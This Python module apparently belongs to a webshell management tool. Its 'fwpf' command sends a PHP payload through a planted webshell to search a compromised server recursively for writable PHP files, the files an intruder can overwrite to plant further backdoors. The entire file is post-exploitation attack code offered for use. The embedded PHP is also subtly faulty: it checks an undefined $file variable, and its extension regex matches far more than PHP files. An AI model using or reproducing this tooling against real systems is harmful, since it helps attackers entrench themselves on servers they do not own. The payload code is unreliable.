from libs.config import alias, gget
from libs.myapp import send, color, print_tree
from json import JSONDecodeError


def get_php(file_path: str):
    return """function scan_rescursive($directory) {
    global $cfgs;
    $res = array();
    foreach(glob("$directory/*") as $item) {
        if(is_dir($item)) {
            $items=explode('/', $item);
            $folder = base64_encode(end($items));
            $res[$folder] = scan_rescursive($item);
            continue;
        }
        else if(preg_match('/ph*/i',end(explode('.', $file))) && is_writable($file)){
            $res[] = base64_encode(basename($item));
        }
    }
    return $res;
}
print(json_encode(scan_rescursive("%s")));
""" % file_path


@alias(True, _type="DETECT", fp="web_file_path")
def run(web_file_path: str = ''):
    """
    fwpf

    Search writable php files from target system.

    eg: fwpf {web_file_path=webroot}
    """
    web_file_path = web_file_path if (len(web_file_path)) else gget("webshell.root", "webshell")
    php = get_php(web_file_path)
    try:
        res = send(php)
        if (not res):
            return
        file_tree = res.r_json()
    except JSONDecodeError:
        print(color.red("Parse Error"))
        return
    print_tree(web_file_path, file_tree)
